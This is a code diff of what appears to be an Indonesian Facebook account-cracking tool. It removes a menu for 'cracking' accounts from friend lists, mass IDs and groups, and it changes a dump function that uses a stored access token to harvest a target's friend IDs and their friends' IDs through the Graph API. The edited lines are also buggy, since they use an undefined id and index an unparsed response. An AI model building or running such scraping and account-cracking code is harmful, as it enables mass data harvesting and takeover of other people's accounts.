@@ -220,57 +220,12 @@ def bottzy():
 def kanjoed():
 	main()
 
-def menu():
-	try:sh = requests.get('https://httpbin.org/ip').json()
-	except:sh = {'origin':'-'}
-	try:
-		tglx = my_birthday.split('/')[1]
-		blnx = dic2[str(my_birthday.split('/')[0])]
-		thnx = my_birthday.split('/')[2]
-		birth = tglx+' '+blnx+' '+thnx
-	except:birth = '-'
-	banner()
-	sg = '>_Menu Tools Crack Facebook'
-	fx = mark(sg, style='red')
-	sol().print(fx)
-	#print(x+'['+h+'•'+x+'] \033[0;33m>_Nama Kamu  : '+str(my_name))
-	#print(x+'['+h+'•'+x+'] \033[0;33m>_ID Kamu    : '+str(my_id))
-	#print(x+'['+h+'•'+x+'] \033[33m>_Tanggal Kamu  : '+str(birth))
-	#print(x+'['+h+'•'+x+'] \033[33m>_IP Kamu   : '+str(sh['origin']))
-	io = '\x1b[1;95m[01] >_Crack Dari Pertemanan Publik\n\x1b[1;95m[02] >_Crack ID Dari Akun Publik (Massal) \n\x1b[1;95m[03] >_Crack Dari Grup\n\x1b[1;95m[04] >_Cek Hasil Crack\n\033\x1b[1;95m[05] >_Cek Hasil Crack [00] >_Keluar'
-	oi = nel(io, style='cyan')
-	cetak(nel(oi, title='>_Pilih 1 Sampai 8'))
-	jh = input('\033[33m>_Pilih : ')
-	if jh in ['1','01']:
-		dump_publik()
-	elif jh in ['2','02']:		
-		dump_massal()
-	elif jh in ['3','03']:
-		grup()
-	elif jh in ['4','04']:
-		result()
-	elif jh in ['5','05']:
-		file()
-		#elif jh in ['10','0010']:
-		#fritoken()
-	elif jh in ['0','00']:
-		os.system('rm -rf .token.txt')
-		print('\033[33m>_Tunggu ...')
-		time.sleep(1)
-		sw = '>_Berhasil Keluar'
-		sol().print(mark(sw, style='green'))
-		exit()
-	else:
-		ric = '>_Pilih Yang Benar'
-		sol().print(mark(ric, style='red'))
-		exit()
-
 def dump():
 	try:
 		it = input('%s[%s•%s] %sID Target : '%(O,P,O,P))
 		try:
 			token = open('token.txt','r').read()
-			mm = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
+			mm = requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(id,token))
 			print ('%s[%s•%s] %sName : %s'%(O,P,O,P,mm['name']))
 		except (KeyError,IOError):
 			jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
@@ -279,13 +234,13 @@ def dump():
 		te=[]
 		lim = input('%s[%s•%s] %sLimit Dump : '%(O,P,O,P))
 		print('%s>_%s'%(O,P))
-		ada = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
+		ada = requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(id,token))
 		idi = json.loads(ada.text)
 		for x in idi['data']:
 			tt.append(x['id'])
 		for id in tt:
 			try:
-				ada2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
+				ada2 = requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(id,token))
 				idi2 = json.loads(ada2.text)
 				try:
 					for b in idi2['data']:
